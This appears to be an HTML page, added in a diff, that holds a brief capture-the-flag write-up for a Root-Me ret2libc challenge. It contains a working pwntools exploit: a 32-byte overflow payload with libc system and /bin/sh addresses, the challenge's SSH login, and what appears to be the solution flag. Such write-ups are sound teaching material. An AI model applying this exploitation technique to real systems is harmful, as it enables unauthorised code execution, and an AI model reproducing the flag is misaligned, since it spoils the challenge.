@@ -1,0 +1,92 @@
+<html>
+ <head>
+<title> Chall-6 </title>
+
+ <link rel="stylesheet" type="text/css" href="test1.css" />
+ <link rel="stylesheet" type="text/css" href="fonts.css" />
+</head>
+<style>
+
+      body {background-color:white;
+	border-bottom:1px solid #bfbfbf
+         line-height:1.5em;
+	color:#222}
+ 
+   p{color:black;
+        /*font-style: italic;
+       font-family: "Times New Roman";*/
+      letter-spacing: 2px;
+       font-size: 20px;
+       margin-top: 10px;
+       margin-bottom: 10px;
+        margin-right: 150px;
+       margin-left: 150px; 
+       }
+
+
+
+    h1{ color:black;
+         font-style: italic;
+        font-size:2.2em;
+	font-family:"PT Serif","Georgia","Helvetica Neue",Arial,sans-serif;
+	font-weight:normal;
+	line-height:1.2em;
+	margin-bottom:0.6667em
+        margin-right: 150px;
+       margin-left: 150px;}
+
+code { 
+display: block; white-space: pre-wrap; 
+border: 1px solid #000; 
+padding: 10px; 
+line-height: 1.5em; 
+font-family: "Lucida Console", Monaco, monospace; 
+} 
+.code-str 
+{ color:#ff33d4; } 
+ .code-comment { color:#3c33ff; } 
+ .code-key { color:#9933ff; }
+ .code-brown{color:#ba4a00} 
+
+
+</style>
+<body>
+
+<script src="null.js"></script>
+
+<div style="position: relative; background: url('http://hackerbuck.net23.net/css/bgm.png'); width: 1210px; height: 110px;">
+ <div style="position: absolute; bottom: 0; left: 0.5em; width: 400px; font-weight: bold; color: #fff;">
+ <p style="color:white;font-size:2.2em;"> chall-6 </p>
+ </div>
+ </div>
+
+
+ <br> <br>  <br>          
+
+<h1 class="post-title"> ret2libc </h1>
+   
+ <br> 
+
+<p> This one was pretty easy using gdb-peda pattern create i quickly found the eip offset to be 32 and then as nx was enabled use ret2libc that's it </p>
+
+<code>from pwn import *
+
+#system=0xf7e32160
+#binsh=0xf7f565db
+
+rsystem=0xb7e690b0
+rbinsh=0xb7f8ac40
+
+payload="A"*32+pack(rsystem)+pack(0xdeadbeef)+pack(rbinsh)
+
+s=ssh(host='challenge02.root-me.org',user='app-systeme-ch33',password='app-systeme-ch33',port=2222)
+
+p=s.process(['ch33',payload])
+
+p.interactive()
+
+# R3t2l1bcISnicet0o!</code>
+
+
+</body>
+</html>
